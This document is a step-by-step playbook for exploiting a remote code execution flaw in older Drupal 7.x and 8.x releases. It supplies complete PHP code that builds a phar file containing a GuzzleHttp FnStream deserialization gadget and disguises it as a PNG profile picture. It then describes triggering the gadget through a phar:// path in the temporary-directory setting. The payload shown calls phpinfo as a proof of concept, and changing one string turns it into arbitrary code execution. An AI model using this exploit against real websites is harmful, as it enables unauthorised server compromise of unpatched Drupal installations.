####
#Drupal playbook for exploiting, Remote code execution vulnerability
#
#Drupal versions 7.x prior to 7.62, 8.6.x prior to 8.6.6 and
#8.5.x prior to 8.5.9 are having a remote code execution vulnerability 
#
####	

1. Save the below code into drupalexploit.php

```
<?php

namespace GuzzleHttp\Psr7 {
	class FnStream {

		public $_fn_close = "phpinfo";

		public function __destruct() {
			if (isset($this->_fn_close)) {
				call_user_func($this->_fn_close);
			}
		}
	}
}

namespace {
	@unlink("phar.phar");
	$phar = new Phar("phar.phar");
	$phar->startBuffering();
	$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");
	$o = new \GuzzleHttp\Psr7\FnStream();
	$phar->setMetadata($o);
	$phar->addFromString("test.txt", "test");
	$phar->stopBuffering();

}
?>
```

2. Execute the below command
	$php drupalexploit.php

3. A new file will be created with an extension ".phar" in the current directory

4. Rename the ".phar" extension of the file to ".png" using below command.
	eg. mv phar.phar phar.png

5. Upload this "phar.png" file as profile pic in the drupal website.

	Please follow path, 
	1. Click on <User> -> 
	2. Click on Edit   -> 
	3. Upload the "phar.png" file in the mentioned area.
	
6. Click on the uploaded image file and copy the URL, excluding till IP address.
	eg. sites/default/files/pictures/.../phar.png
	
7. Go to below path 
	Manage -> config -> file systems -> temporary directory 
	
8. Paste the copied URL in the below format.
	phar://./sites/default/files/pictures/.../phar.png

9. Click on "Save configuration"

10. Confirm the PHP info from in the page. 
